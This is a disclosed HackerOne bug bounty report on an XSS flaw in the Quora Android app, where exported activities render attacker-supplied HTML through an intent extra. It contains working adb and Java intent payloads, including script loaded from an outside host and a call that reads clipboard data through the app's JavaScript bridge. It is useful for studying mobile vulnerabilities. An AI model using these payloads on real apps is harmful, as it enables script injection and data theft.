# [Android] XSS via start ContentActivity

## Report Details
- **Report ID**: 189793
- **URL**: https://hackerone.com/reports/189793
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-09T11:15:23.428Z
- **Disclosed**: 2017-04-05T06:23:59.999Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: quora

## Vulnerability Information
**Summary:**
XSS via start ContentActivity using 'html' parameter.

**Description (Include Impact):**
Arbitrary applications on Android can run the exported activities ContentActivity, ModalContentActivity and ActionBarContentActivity. Using intent extra parameter `html` we can pass javascript, which will be executed in the context of www.quora.com.

Impact: 
* typical XSS on www.quora.com
* access to QuoraAndroid JSBridge (for example, ClipboardData )
* RCE on old Android <= 4.2 (see references)

### Steps To Reproduce

**Using ADB**
alert(123)
```
adb shell
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html 'XSS<script>alert(123)</script>'
```
Run script from external host
```
am start -n com.quora.android/com.quora.android.ActionBarContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
am start -n com.quora.android/com.quora.android.ContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script src=//blackfan.ru></script>'
```

Access to ClipboardData
```
am start -n com.quora.android/com.quora.android.ModalContentActivity -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
```

**Using another app**
```
Intent i = new Intent();
i.setComponent(new ComponentName("com.quora.android","com.quora.android.ActionBarContentActivity"));
i.putExtra("url","http://test/test");
i.putExtra("html","XSS PoC <script>alert(123)</script>");
startActivity(i);
```

### Your Environment (Browser version, Device, app version, os version etc)

 * Nexus 5, Android 6.0.1

### Supporting Material/References (Screenshots)

 * https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/

**XSS**
{F142023}

**Access to ClipboardData**
{F142024}

## Attachments
- Screenshot_20161209-150324.png
- Screenshot_20161209-145102.png
